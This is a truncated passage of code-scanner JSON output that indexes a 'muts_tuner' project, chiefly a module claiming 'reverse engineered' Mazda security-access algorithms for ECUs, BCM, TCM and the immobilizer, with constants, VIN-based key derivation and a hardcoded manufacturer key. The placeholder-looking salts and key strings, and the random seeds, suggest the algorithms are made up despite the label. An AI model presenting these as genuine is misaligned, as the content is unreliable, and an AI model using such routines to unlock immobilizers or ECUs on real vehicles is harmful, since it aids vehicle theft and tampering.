"ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_MANUFACTURER: self._algorithm_manufacturer,"}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "MazdaSecurityAlgorithm.ALGORITHM_CALIBRATION: self._algorithm_calibration"}, {"type": "hardware", "line": 55, "hardware": "ECU", "content": "def calculate_seed_key(self, seed: bytes, algorithm: MazdaSecurityAlgorithm,"}, {"type": "hardware", "line": 58, "hardware": "ECU", "content": "Calculate security key from seed using specified algorithm"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "seed: Seed bytes from ECU"}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "algorithm: Security algorithm to use"}, {"type": "hardware", "line": 63, "hardware": "vehicle", "content": "vin: Vehicle VIN for VIN-based algorithms"}, {"type": "hardware", "line": 71, "hardware": "ECU", "content": "logger.error(f\"Unknown security algorithm: {algorithm}\")"}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "Standard 0x27 Security Algorithm"}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "Used for basic ECU access and diagnostics"}, {"type": "hardware", "line": 115, "hardware": "ECU", "content": "Enhanced 0x27 Security Algorithm"}, {"type": "hardware", "line": 144, "hardware": "TCM", "content": "def _algorithm_tcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 147, "hardware": "ECU", "content": "TCM Security Algorithm"}, {"type": "hardware", "line": 147, "hardware": "TCM", "content": "TCM Security Algorithm"}, {"type": "hardware", "line": 151, "hardware": "TCM", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "hardware", "line": 163, "hardware": "immobilizer", "content": "def _algorithm_immobilizer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 166, "hardware": "ECU", "content": "Immobilizer Security Algorithm"}, {"type": "hardware", "line": 166, "hardware": "immobilizer", "content": "Immobilizer Security Algorithm"}, {"type": "hardware", "line": 170, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "hardware", "line": 173, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer algorithm requires VIN\")"}, {"type": "hardware", "line": 176, "hardware": "immobilizer", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "hardware", "line": 176, "hardware": "vehicle", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "hardware", "line": 179, "hardware": "vehicle", "content": "des_key = vehicle_key[:24]  # 24 bytes for 3DES"}, {"type": "hardware", "line": 186, "hardware": "immobilizer", "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "hardware", "line": 188, "hardware": "immobilizer", "content": "Derive immobilizer key from VIN"}, {"type": "hardware", "line": 195, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "hardware", "line": 196, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "hardware", "line": 200, "hardware": "BCM", "content": "def _algorithm_bcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "BCM Security Algorithm"}, {"type": "hardware", "line": 203, "hardware": "BCM", "content": "BCM Security Algorithm"}, {"type": "hardware", "line": 207, "hardware": "BCM", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "hardware", "line": 229, "hardware": "ECU", "content": "Manufacturer Security Algorithm"}, {"type": "hardware", "line": 247, "hardware": "ECU", "content": "This would be obtained from secure storage in real implementation"}, {"type": "hardware", "line": 257, "hardware": "ECU", "content": "Calibration Security Algorithm"}, {"type": "hardware", "line": 284, "hardware": "ECU", "content": "def request_seed(self, ecu_address: int, security_level: int) -> Optional[bytes]:"}, {"type": "hardware", "line": 286, "hardware": "ECU", "content": "Request seed from ECU for security access"}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "ecu_address: ECU address to request seed from"}, {"type": "hardware", "line": 290, "hardware": "ECU", "content": "security_level: Security access level"}, {"type": "hardware", "line": 299, "hardware": "ECU", "content": "seed_length = self._get_seed_length_for_level(security_level)"}, {"type": "hardware", "line": 302, "hardware": "ECU", "content": "logger.debug(f\"Generated seed for level {security_level}: {seed.hex().upper()}\")"}, {"type": "hardware", "line": 309, "hardware": "ECU", "content": "def _get_seed_length_for_level(self, security_level: int) -> int:"}, {"type": "hardware", "line": 310, "hardware": "ECU", "content": "\"\"\"Get required seed length for security level\"\"\""}, {"type": "hardware", "line": 320, "hardware": "ECU", "content": "return seed_lengths.get(security_level, 4)"}, {"type": "hardware", "line": 322, "hardware": "ECU", "content": "def send_key(self, ecu_address: int, security_level: int, key: bytes) -> bool:"}, {"type": "hardware", "line": 324, "hardware": "ECU", "content": "Send calculated key to ECU for security access"}, {"type": "hardware", "line": 327, "hardware": "ECU", "content": "ecu_address: ECU address to send key to"}, {"type": "hardware", "line": 328, "hardware": "ECU", "content": "security_level: Security access level"}, {"type": "hardware", "line": 332, "hardware": "ECU", "content": "True if security access granted"}, {"type": "hardware", "line": 337, "hardware": "ECU", "content": "logger.debug(f\"Sending key for level {security_level}: {key.hex().upper()}\")"}, {"type": "hardware", "line": 346, "hardware": "ECU", "content": "def perform_security_access(self, ecu_address: int, security_level: int,"}, {"type": "hardware", "line": 347, "hardware": "ECU", "content": "algorithm: MazdaSecurityAlgorithm,"}, {"type": "hardware", "line": 351, "hardware": "ECU", "content": "Perform complete security access procedure"}, {"type": "hardware", "line": 354, "hardware": "ECU", "content": "ecu_address: ECU address to access"}, {"type": "hardware", "line": 355, "hardware": "ECU", "content": "security_level: Security access level"}, {"type": "hardware", "line": 356, "hardware": "ECU", "content": "algorithm: Security algorithm to use"}, {"type": "hardware", "line": 357, "hardware": "vehicle", "content": "vin: Vehicle VIN (if required)"}, {"type": "hardware", "line": 361, "hardware": "ECU", "content": "True if security access successful"}, {"type": "hardware", "line": 364, "hardware": "ECU", "content": "logger.info(f\"Performing security access for ECU 0x{ecu_address:04X}, level {security_level}\")"}, {"type": "hardware", "line": 367, "hardware": "ECU", "content": "seed = self.request_seed(ecu_address, security_level)"}, {"type": "hardware", "line": 369, "hardware": "ECU", "content": "logger.error(\"Failed to request seed from ECU\")"}, {"type": "hardware", "line": 375, "hardware": "ECU", "content": "logger.error(\"Failed to calculate security key\")"}, {"type": "hardware", "line": 379, "hardware": "ECU", "content": "access_granted = self.send_key(ecu_address, security_level, key)"}, {"type": "hardware", "line": 382, "hardware": "ECU", "content": "logger.info(\"Security access granted\")"}, {"type": "hardware", "line": 384, "hardware": "ECU", "content": "logger.error(\"Security access denied\")"}, {"type": "hardware", "line": 389, "hardware": "ECU", "content": "logger.error(f\"Error during security access: {e}\")"}], "security_logic": [{"type": "security_pattern", "line": 7, "pattern": "algorithm", "content": "MAZDA SECURITY ACCESS - Reverse Engineered Algorithms"}, {"type": "security_pattern", "line": 11, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 16, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 16, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 18, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 23, "pattern": "algorithm", "content": "class MazdaSecurityAlgorithm(IntEnum):"}, {"type": "security_pattern", "line": 24, "pattern": "algorithm", "content": "\"\"\"Mazda Security Algorithms - Reverse Engineered\"\"\""}, {"type": "security_pattern", "line": 25, "pattern": "algorithm", "content": "ALGORITHM_27_STANDARD = 1      # Standard 0x27 security"}, {"type": "security_pattern", "line": 26, "pattern": "algorithm", "content": "ALGORITHM_27_ENHANCED = 2      # Enhanced security"}, {"type": "security_pattern", "line": 27, "pattern": "algorithm", "content": "ALGORITHM_TCM = 3              # Transmission control module"}, {"type": "security_pattern", "line": 28, "pattern": "algorithm", "content": "ALGORITHM_IMMOBILIZER = 4      # Immobilizer system"}, {"type": "security_pattern", "line": 29, "pattern": "algorithm", "content": "ALGORITHM_BCM = 5              # Body control module"}, {"type": "security_pattern", "line": 30, "pattern": "algorithm", "content": "ALGORITHM_MANUFACTURER = 6     # Manufacturer access"}, {"type": "security_pattern", "line": 31, "pattern": "algorithm", "content": "ALGORITHM_CALIBRATION = 7      # Calibration access"}, {"type": "security_pattern", "line": 36, "pattern": "algorithm", "content": "Reverse engineered from IDS/M-MDS security algorithms"}, {"type": "security_pattern", "line": 40, "pattern": "algorithm", "content": "self.algorithm_database = self._initialize_algorithms()"}, {"type": "security_pattern", "line": 41, "pattern": "key", "content": "self.vehicle_key_cache = {}"}, {"type": "security_pattern", "line": 43, "pattern": "algorithm", "content": "def _initialize_algorithms(self) -> Dict[MazdaSecurityAlgorithm, callable]:"}, {"type": "security_pattern", "line": 44, "pattern": "algorithm", "content": "\"\"\"Initialize all security algorithms\"\"\""}, {"type": "security_pattern", "line": 46, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_27_STANDARD: self._algorithm_27_standard,"}, {"type": "security_pattern", "line": 47, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_27_ENHANCED: self._algorithm_27_enhanced,"}, {"type": "security_pattern", "line": 48, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_TCM: self._algorithm_tcm,"}, {"type": "security_pattern", "line": 49, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_IMMOBILIZER: self._algorithm_immobilizer,"}, {"type": "security_pattern", "line": 50, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_BCM: self._algorithm_bcm,"}, {"type": "security_pattern", "line": 51, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_MANUFACTURER: self._algorithm_manufacturer,"}, {"type": "security_pattern", "line": 52, "pattern": "algorithm", "content": "MazdaSecurityAlgorithm.ALGORITHM_CALIBRATION: self._algorithm_calibration"}, {"type": "security_pattern", "line": 55, "pattern": "key", "content": "def calculate_seed_key(self, seed: bytes, algorithm: MazdaSecurityAlgorithm,"}, {"type": "security_pattern", "line": 55, "pattern": "seed", "content": "def calculate_seed_key(self, seed: bytes, algorithm: MazdaSecurityAlgorithm,"}, {"type": "security_pattern", "line": 55, "pattern": "algorithm", "content": "def calculate_seed_key(self, seed: bytes, algorithm: MazdaSecurityAlgorithm,"}, {"type": "security_pattern", "line": 58, "pattern": "key", "content": "Calculate security key from seed using specified algorithm"}, {"type": "security_pattern", "line": 58, "pattern": "seed", "content": "Calculate security key from seed using specified algorithm"}, {"type": "security_pattern", "line": 58, "pattern": "algorithm", "content": "Calculate security key from seed using specified algorithm"}, {"type": "security_pattern", "line": 61, "pattern": "seed", "content": "seed: Seed bytes from ECU"}, {"type": "security_pattern", "line": 62, "pattern": "algorithm", "content": "algorithm: Security algorithm to use"}, {"type": "security_pattern", "line": 63, "pattern": "algorithm", "content": "vin: Vehicle VIN for VIN-based algorithms"}, {"type": "security_pattern", "line": 64, "pattern": "algorithm", "content": "additional_data: Additional data required by some algorithms"}, {"type": "security_pattern", "line": 67, "pattern": "key", "content": "Calculated key bytes or None if failed"}, {"type": "security_pattern", "line": 70, "pattern": "algorithm", "content": "if algorithm not in self.algorithm_database:"}, {"type": "security_pattern", "line": 71, "pattern": "algorithm", "content": "logger.error(f\"Unknown security algorithm: {algorithm}\")"}, {"type": "security_pattern", "line": 75, "pattern": "key", "content": "key = self.algorithm_database[algorithm](seed, vin, additional_data)"}, {"type": "security_pattern", "line": 75, "pattern": "seed", "content": "key = self.algorithm_database[algorithm](seed, vin, additional_data)"}, {"type": "security_pattern", "line": 75, "pattern": "algorithm", "content": "key = self.algorithm_database[algorithm](seed, vin, additional_data)"}, {"type": "security_pattern", "line": 77, "pattern": "key", "content": "if key:"}, {"type": "security_pattern", "line": 78, "pattern": "key", "content": "logger.debug(f\"Calculated key for algorithm {algorithm.name}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 78, "pattern": "algorithm", "content": "logger.debug(f\"Calculated key for algorithm {algorithm.name}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "logger.error(f\"Failed to calculate key for algorithm {algorithm.name}\")"}, {"type": "security_pattern", "line": 80, "pattern": "algorithm", "content": "logger.error(f\"Failed to calculate key for algorithm {algorithm.name}\")"}, {"type": "security_pattern", "line": 82, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 85, "pattern": "key", "content": "logger.error(f\"Error calculating seed key: {e}\")"}, {"type": "security_pattern", "line": 85, "pattern": "seed", "content": "logger.error(f\"Error calculating seed key: {e}\")"}, {"type": "security_pattern", "line": 88, "pattern": "seed", "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 88, "pattern": "algorithm", "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 91, "pattern": "algorithm", "content": "Standard 0x27 Security Algorithm"}, {"type": "security_pattern", "line": 94, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 95, "pattern": "seed", "content": "raise ValueError(\"Standard algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 95, "pattern": "algorithm", "content": "raise ValueError(\"Standard algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 97, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 102, "pattern": "seed", "content": "temp = seed[i] ^ 0x73"}, {"type": "security_pattern", "line": 108, "pattern": "key", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 110, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 112, "pattern": "seed", "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 112, "pattern": "algorithm", "content": "def _algorithm_27_enhanced(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 115, "pattern": "algorithm", "content": "Enhanced 0x27 Security Algorithm"}, {"type": "security_pattern", "line": 118, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 119, "pattern": "seed", "content": "raise ValueError(\"Enhanced algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 119, "pattern": "algorithm", "content": "raise ValueError(\"Enhanced algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 121, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 126, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 140, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 142, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 144, "pattern": "seed", "content": "def _algorithm_tcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 144, "pattern": "algorithm", "content": "def _algorithm_tcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 147, "pattern": "algorithm", "content": "TCM Security Algorithm"}, {"type": "security_pattern", "line": 150, "pattern": "seed", "content": "if len(seed) != 2:"}, {"type": "security_pattern", "line": 151, "pattern": "seed", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "security_pattern", "line": 151, "pattern": "algorithm", "content": "raise ValueError(\"TCM algorithm requires 2-byte seed\")"}, {"type": "security_pattern", "line": 153, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 156, "pattern": "key", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 156, "pattern": "seed", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 157, "pattern": "key", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 157, "pattern": "seed", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 158, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 159, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 161, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 163, "pattern": "seed", "content": "def _algorithm_immobilizer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 163, "pattern": "algorithm", "content": "def _algorithm_immobilizer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 166, "pattern": "algorithm", "content": "Immobilizer Security Algorithm"}, {"type": "security_pattern", "line": 167, "pattern": "key", "content": "Uses VIN-based key derivation and DES encryption"}, {"type": "security_pattern", "line": 167, "pattern": "encrypt", "content": "Uses VIN-based key derivation and DES encryption"}, {"type": "security_pattern", "line": 169, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 170, "pattern": "seed", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 170, "pattern": "algorithm", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 173, "pattern": "algorithm", "content": "raise ValueError(\"Immobilizer algorithm requires VIN\")"}, {"type": "security_pattern", "line": 176, "pattern": "key", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "security_pattern", "line": 179, "pattern": "key", "content": "des_key = vehicle_key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 180, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 180, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 180, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 181, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 181, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 183, "pattern": "key", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 183, "pattern": "encrypt", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 183, "pattern": "seed", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 184, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 186, "pattern": "key", "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "security_pattern", "line": 188, "pattern": "key", "content": "Derive immobilizer key from VIN"}, {"type": "security_pattern", "line": 194, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 194, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 195, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 195, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 196, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 196, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 198, "pattern": "key", "content": "return key[:24]  # 24 bytes for 3DES"}, {"type": "security_pattern", "line": 200, "pattern": "seed", "content": "def _algorithm_bcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 200, "pattern": "algorithm", "content": "def _algorithm_bcm(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 203, "pattern": "algorithm", "content": "BCM Security Algorithm"}, {"type": "security_pattern", "line": 206, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 207, "pattern": "seed", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 207, "pattern": "algorithm", "content": "raise ValueError(\"BCM algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 209, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 213, "pattern": "seed", "content": "temp = seed[i]"}, {"type": "security_pattern", "line": 222, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 224, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 226, "pattern": "seed", "content": "def _algorithm_manufacturer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 226, "pattern": "algorithm", "content": "def _algorithm_manufacturer(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 229, "pattern": "algorithm", "content": "Manufacturer Security Algorithm"}, {"type": "security_pattern", "line": 232, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 233, "pattern": "seed", "content": "raise ValueError(\"Manufacturer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 233, "pattern": "algorithm", "content": "raise ValueError(\"Manufacturer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 236, "pattern": "key", "content": "manufacturer_key = self._get_manufacturer_key()"}, {"type": "security_pattern", "line": 238, "pattern": "key", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 238, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 238, "pattern": "cipher", "content": "cipher = Cipher(algorithms.AES(manufacturer_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 239, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 239, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 241, "pattern": "key", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 241, "pattern": "encrypt", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 241, "pattern": "seed", "content": "key = encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 242, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 244, "pattern": "key", "content": "def _get_manufacturer_key(self) -> bytes:"}, {"type": "security_pattern", "line": 246, "pattern": "key", "content": "Get manufacturer master key"}, {"type": "security_pattern", "line": 251, "pattern": "key", "content": "base_key = b'mazda_manufacturer_key_2024'"}, {"type": "security_pattern", "line": 252, "pattern": "key", "content": "return hashlib.sha256(base_key).digest()[:16]  # 16 bytes for AES-128"}, {"type": "security_pattern", "line": 252, "pattern": "hash", "content": "return hashlib.sha256(base_key).digest()[:16]  # 16 bytes for AES-128"}, {"type": "security_pattern", "line": 254, "pattern": "seed", "content": "def _algorithm_calibration(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 254, "pattern": "algorithm", "content": "def _algorithm_calibration(self, seed: bytes, vin: Optional[str] = None,"}, {"type": "security_pattern", "line": 257, "pattern": "algorithm", "content": "Calibration Security Algorithm"}, {"type": "security_pattern", "line": 260, "pattern": "seed", "content": "if len(seed) != 6:"}, {"type": "security_pattern", "line": 261, "pattern": "seed", "content": "raise ValueError(\"Calibration algorithm requires 6-byte seed\")"}, {"type": "security_pattern", "line": 261, "pattern": "algorithm", "content": "raise ValueError(\"Calibration algorithm requires 6-byte seed\")"}, {"type": "security_pattern", "line": 264, "pattern": "algorithm", "content": "raise ValueError(\"Calibration algorithm requires additional data\")"}, {"type": "security_pattern", "line": 266, "pattern": "key", "content": "key = bytearray(6)"}, {"type": "security_pattern", "line": 270, "pattern": "seed", "content": "seed_byte = seed[i]"}, {"type": "security_pattern", "line": 274, "pattern": "seed", "content": "temp = (seed_byte + data_byte) & 0xFF"}, {"type": "security_pattern", "line": 280, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 282, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 284, "pattern": "seed", "content": "def request_seed(self, ecu_address: int, security_level: int) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 286, "pattern": "seed", "content": "Request seed from ECU for security access"}, {"type": "security_pattern", "line": 289, "pattern": "seed", "content": "ecu_address: ECU address to request seed from"}, {"type": "security_pattern", "line": 293, "pattern": "seed", "content": "Seed bytes or None if failed"}, {"type": "security_pattern", "line": 299, "pattern": "seed", "content": "seed_length = self._get_seed_length_for_level(security_level)"}, {"type": "security_pattern", "line": 300, "pattern": "seed", "content": "seed = bytes([random.randint(0, 255) for _ in range(seed_length)])"}, {"type": "security_pattern", "line": 302, "pattern": "seed", "content": "logger.debug(f\"Generated seed for level {security_level}: {seed.hex().upper()}\")"}, {"type": "security_pattern", "line": 303, "pattern": "seed", "content": "return seed"}, {"type": "security_pattern", "line": 306, "pattern": "seed", "content": "logger.error(f\"Error requesting seed: {e}\")"}, {"type": "security_pattern", "line": 309, "pattern": "seed", "content": "def _get_seed_length_for_level(self, security_level: int) -> int:"}, {"type": "security_pattern", "line": 310, "pattern": "seed", "content": "\"\"\"Get required seed length for security level\"\"\""}, {"type": "security_pattern", "line": 311, "pattern": "seed", "content": "seed_lengths = {"}, {"type": "security_pattern", "line": 320, "pattern": "seed", "content": "return seed_lengths.get(security_level, 4)"}, {"type": "security_pattern", "line": 322, "pattern": "key", "content": "def send_key(self, ecu_address: int, security_level: int, key: bytes) -> bool:"}, {"type": "security_pattern", "line": 324, "pattern": "key", "content": "Send calculated key to ECU for security access"}, {"type": "security_pattern", "line": 327, "pattern": "key", "content": "ecu_address: ECU address to send key to"}, {"type": "security_pattern", "line": 329, "pattern": "key", "content": "key: Calculated key bytes"}, {"type": "security_pattern", "line": 337, "pattern": "key", "content": "logger.debug(f\"Sending key for level {security_level}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 343, "pattern": "key", "content": "logger.error(f\"Error sending key: {e}\")"}, {"type": "security_pattern", "line": 346, "pattern": "security_access", "content": "def perform_security_access(self, ecu_address: int, security_level: int,"}, {"type": "security_pattern", "line": 347, "pattern": "algorithm", "content": "algorithm: MazdaSecurityAlgorithm,"}, {"type": "security_pattern", "line": 356, "pattern": "algorithm", "content": "algorithm: Security algorithm to use"}, {"type": "security_pattern", "line": 367, "pattern": "seed", "content": "seed = self.request_seed(ecu_address, security_level)"}, {"type": "security_pattern", "line": 368, "pattern": "seed", "content": "if not seed:"}, {"type": "security_pattern", "line": 369, "pattern": "seed", "content": "logger.error(\"Failed to request seed from ECU\")"}, {"type": "security_pattern", "line": 373, "pattern": "key", "content": "key = self.calculate_seed_key(seed, algorithm, vin, additional_data)"}, {"type": "security_pattern", "line": 373, "pattern": "seed", "content": "key = self.calculate_seed_key(seed, algorithm, vin, additional_data)"}, {"type": "security_pattern", "line": 373, "pattern": "algorithm", "content": "key = self.calculate_seed_key(seed, algorithm, vin, additional_data)"}, {"type": "security_pattern", "line": 374, "pattern": "key", "content": "if not key:"}, {"type": "security_pattern", "line": 375, "pattern": "key", "content": "logger.error(\"Failed to calculate security key\")"}, {"type": "security_pattern", "line": 379, "pattern": "key", "content": "access_granted = self.send_key(ecu_address, security_level, key)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts_tuner/complete_tuner/mds3.py", "lines_read": 605, "features_found": [{"type": "function", "name": "__init__", "line": 50}, {"type": "function", "name": "_initialize_dtc_database", "line": 53}, {"type": "function", "name": "get_dtc_definition", "line": 564}, {"type": "function", "name": "get_dtcs_by_system", "line": 568}, {"type": "function", "name": "get_dtcs_by_severity", "line": 572}, {"type": "function", "name": "get_mazda_specific_dtcs", "line": 576}, {"type": "function", "name": "search_dtcs", "line": 580}, {"type": "function", "name": "get_diagnostic_procedure", "line": 593}, {"type": "function", "name": "get_repair_procedure", "line": 600}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "Enum", "line": null}], "components_found": [{"type": "class", "name": "DTCSeverity", "line": 15}, {"type": "class", "name": "DTCStatus", "line": 21}, {"type": "class", "name": "DTCDefinition", "line": 28}, {"type": "class", "name": "MazdaDTCDatabase", "line": 44}], "algorithms": [], "protocols": [{"type": "protocol", "line": 529, "protocol": "CAN", "content": "\"CAN bus communication failure\","}, {"type": "protocol", "line": 536, "protocol": "CAN", "content": "\"Check CAN bus communication with scan tool\","}, {"type": "protocol", "line": 543, "protocol": "CAN", "content": "\"Repair CAN bus wiring if damaged\","}, {"type": "protocol", "line": 549, "protocol": "CAN", "content": "\"CAN bus communication status\","}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 133, "hardware": "ECU", "content": "\"Fault condition no longer present for 3 consecutive drive cycles\","}, {"type": "hardware", "line": 175, "hardware": "ECU", "content": 